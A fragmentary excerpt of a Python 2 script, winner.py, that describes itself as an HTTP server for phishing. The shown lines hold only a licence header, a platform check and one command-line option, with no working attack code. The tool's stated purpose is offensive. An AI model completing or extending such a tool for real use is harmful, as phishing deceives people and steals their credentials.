#!/usr/bin/env python2
#
# winner.py - HTTP server for phishing
#
#  Winner is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  Winner is distributed in the hope that it will be useful,
...
#
# Copyright (C) 2015 XnuversXploitXen
#
...
def tests_platform():
    if "linux" in sys.platform:
        #printt(3, "Running Winner on linux ... (All good)")
        pass
    elif "darwin" in sys.platform:
        #printt(3, "Running Winner on \'Mac\' (All good)")
        pass
    elif "win" in sys.platform:
        print("Sorry, there is no support for windows right now.")
        sys.exit(1)
    else:
        printt(3, "If \'Winner\' runs sucsessfuly on your platform %s\nPlease let me (@XnuversXploitXen) know!" %sys.platform)
...
def main():
    ...
    parser.add_option("-p", "--profile", dest="profile", help="Load Winner profile.")
